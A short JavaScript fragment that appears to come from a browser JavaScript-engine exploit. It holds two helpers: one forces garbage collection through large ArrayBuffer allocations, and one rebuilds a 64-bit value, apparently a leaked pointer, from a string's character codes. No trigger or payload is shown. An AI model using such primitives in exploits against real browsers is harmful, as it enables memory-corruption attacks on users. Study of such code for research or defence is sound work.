function gc() {
    for (let i = 0; i < 0x60; i++) { new ArrayBuffer(0x1000000); }
}

function extract(s, offset) {
    let result = [];
    for (let i = offset; i < offset + 4; ++i) {
	let tmp = s.charCodeAt(i + 7)
	result.push((tmp & 0xFF).toString(16).padStart(2, '0'));
	result.push((tmp >>> 8).toString(16).padStart(2, '0'));
    }
    return Int64.to_Int64("0x" + result.reverse().join(""));
}
